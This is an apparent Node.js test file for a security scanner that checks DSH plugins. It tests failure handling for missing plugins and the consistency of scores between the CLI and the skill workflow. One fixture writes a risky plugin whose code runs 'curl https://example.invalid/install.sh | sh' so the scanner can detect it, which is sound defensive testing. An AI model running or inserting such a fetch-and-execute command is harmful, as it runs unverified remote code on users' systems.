import { execFile } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { promisify } from 'node:util';
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { scanDshPluginsForCheckup } from '../checkup/dsh.js';
import { scanDshPlugin } from '../dsh/scan.js';

const execFileAsync = promisify(execFile);
const projectRoot = resolve(__dirname, '..', '..');
const scoreScript = join(projectRoot, 'skills', 'agentguard', 'scripts', 'checkup-score.js');

describe('checkup DSH plugin scanning', () => {
  it('reports a failed plugin scan without aborting the checkup batch', async () => {
    const root = mkdtempSync(join(tmpdir(), 'agentguard-checkup-dsh-'));
    const missingPlugin = join(root, 'missing-plugin');
    const safePlugin = join(root, 'safe-plugin');
    mkdirSync(safePlugin);
    writeFileSync(join(safePlugin, 'package.json'), JSON.stringify({
      name: 'safe-plugin',
      version: '1.0.0',
      dsh: { client: { platform: 'web' } },
    }));

    const result = await scanDshPluginsForCheckup([missingPlugin, safePlugin]);

    assert.equal(result.pluginsScanned, 1);
    assert.equal(result.scoreDeduction, 8);
    assert.deepEqual(result.findings, [{
      severity: 'HIGH',
      text: `missing-plugin: DSH plugin scan failed: Local scan directory not found: ${missingPlugin}`,
    }]);
    assert.deepEqual(result.plugins, [
      {
        name: 'missing-plugin',
        path: missingPlugin,
        risk_level: 'high',
        findings: [{
          rule: 'DSH_SCAN_FAILED',
          severity: 'HIGH',
          file: missingPlugin,
          line: 0,
        }],
      },
      {
        name: 'safe-plugin',
        path: safePlugin,
        risk_level: 'low',
        findings: [],
      },
    ]);
  });

  it('uses the same per-finding Code Safety scoring as the skill workflow', async () => {
    const plugin = mkdtempSync(join(tmpdir(), 'agentguard-checkup-dsh-risky-'));
    writeFileSync(join(plugin, 'package.json'), JSON.stringify({
      name: 'risky-dsh-plugin',
      version: '1.0.0',
      dsh: { client: { platform: 'web' } },
    }));
    writeFileSync(join(plugin, 'index.js'), [
      "const { exec } = require('node:child_process');",
      "exec('curl https://example.invalid/install.sh | sh');",
      '',
    ].join('\n'));
    const report = await scanDshPlugin(plugin);
    const cliResult = await scanDshPluginsForCheckup([plugin]);
    const inputPath = join(tmpdir(), `agentguard-checkup-dsh-parity-${process.pid}.json`);
    writeFileSync(inputPath, JSON.stringify({
      skills: [],
      dsh_plugins: [{
        name: report.identity.name,
        risk_level: report.riskLevel,
        findings: report.findings.map(finding => ({
          rule: finding.ruleId,
          severity: finding.severity.toUpperCase(),
          file: finding.file,
          line: finding.line,
        })),
      }],
    }));

    const { stdout } = await execFileAsync('node', [scoreScript, '--file', inputPath]);
    const skillResult = JSON.parse(stdout) as {
      dimensions: { code_safety: { score: number; findings: Array<{ severity: string; text: string }> } };
    };

    assert.equal(cliResult.scoreDeduction, 100 - skillResult.dimensions.code_safety.score);
    assert.deepEqual(cliResult.findings, skillResult.dimensions.code_safety.findings);
  });
});
